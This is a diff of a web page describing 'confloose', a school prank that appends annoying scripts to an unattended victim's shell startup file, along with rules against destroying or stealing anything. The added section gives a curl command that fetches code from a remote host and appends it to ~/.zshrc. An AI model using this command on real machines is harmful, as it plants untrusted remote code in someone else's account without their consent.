@@ -34,18 +34,31 @@
 <p>A <em>confloose</em> (or "loose configuration") is a collection of the worst a startup
 script can do for you.</p>
 
-<p>When someone leaves his computer without locking it, the tradition here is to
-install such scripts on his computer while he's away -- as such, a confloose is
-a challenge (it makes you learn your unix environment the hard way), and a way
-to remind you to never leave your computer and/or data in public space without
-protection.</p>
+<p>There has been a prank going on from quite some time in my IT school --
+when someone leaves his computer unattended, and without locking it, one would
+append a script to the victim's shell startup file.</p>
+
+<p>The deal is to put really annoying things right off the bat while not harming
+the computer and the data on it -- this prank is meant as a lesson (you should
+not leave your computer unattended in public space), and a fun challenge (at
+least for the one watching from afar)</p>
+
+<h2>
+<a name="how-to-confloose-somebody-" class="anchor" href="#how-to-confloose-somebody-"><span class="octicon octicon-link"></span></a>How to confloose somebody :</h2>
+
+<p><code>curl "http://confloo.se/hard" &gt;&gt; ~/.the_shell_rc</code></p>
+
+<p>So, as an example, confloosing someone using zsh :</p>
+
+<p><code>curl "http://confloo.se/hard" &gt;&gt; ~/.zshrc</code></p>
 
 <h2>
 <a name="rules-" class="anchor" href="#rules-"><span class="octicon octicon-link"></span></a>Rules :</h2>
 
 <ol>
-<li>Don't destroy user data.</li>
-<li>Don't steal user data.</li>
+<li>Don't destroy anything.</li>
+<li>Don't steal anything.</li>
+<li>Try to be cryptic.</li>
 <li>Be fun and creative.</li>
 </ol>
       </section>
